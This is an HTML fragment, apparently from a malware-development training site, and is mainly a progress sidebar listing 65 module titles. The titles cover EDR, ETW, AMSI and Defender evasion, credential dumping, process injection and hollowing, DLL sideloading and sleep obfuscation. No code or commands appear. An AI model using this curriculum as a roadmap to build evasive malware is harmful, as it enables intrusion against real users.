                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill="">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html&amp;toc=true">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html&amp;toc=true">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html&amp;toc=true">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html&amp;toc=true">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html&amp;toc=true">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html&amp;toc=true">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html&amp;toc=true">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html&amp;toc=true">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html&amp;toc=true">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html&amp;toc=true">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html&amp;toc=true">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html&amp;toc=true">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html&amp;toc=true">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html&amp;toc=true">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html&amp;toc=true">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html&amp;toc=true">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html&amp;toc=true">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html&amp;toc=true">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html&amp;toc=true">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html&amp;toc=true">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html&amp;toc=true">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html&amp;toc=true">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html&amp;toc=true">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html&amp;toc=true">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html&amp;toc=true">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html&amp;toc=true">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html&amp;toc=true">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./28.html&amp;toc=true">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./29.html&amp;toc=true">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./30.html&amp;toc=true">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./31.html&amp;toc=true">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./32.html&amp;toc=true">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./33.html&amp;toc=true">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./34.html&amp;toc=true">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./35.html&amp;toc=true">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./36.html&amp;toc=true">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./37.html&amp;toc=true">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./38.html&amp;toc=true">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./39.html&amp;toc=true">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./40.html&amp;toc=true">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./41.html&amp;toc=true">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./42.html&amp;toc=true">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./43.html&amp;toc=true">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./44.html&amp;toc=true">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./45.html&amp;toc=true">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./46.html&amp;toc=true">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./47.html&amp;toc=true">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./48.html&amp;toc=true">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./49.html&amp;toc=true">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./50.html&amp;toc=true">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./51.html&amp;toc=true">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./52.html&amp;toc=true">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./53.html&amp;toc=true">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./54.html&amp;toc=true">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./55.html&amp;toc=true">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./56.html&amp;toc=true">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./57.html&amp;toc=true">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./58.html&amp;toc=true">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./59.html&amp;toc=true">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./60.html&amp;toc=true">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./61.html&amp;toc=true">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./62.html&amp;toc=true">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./63.html&amp;toc=true">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./64.html&amp;toc=true">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./65.html&amp;toc=true">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
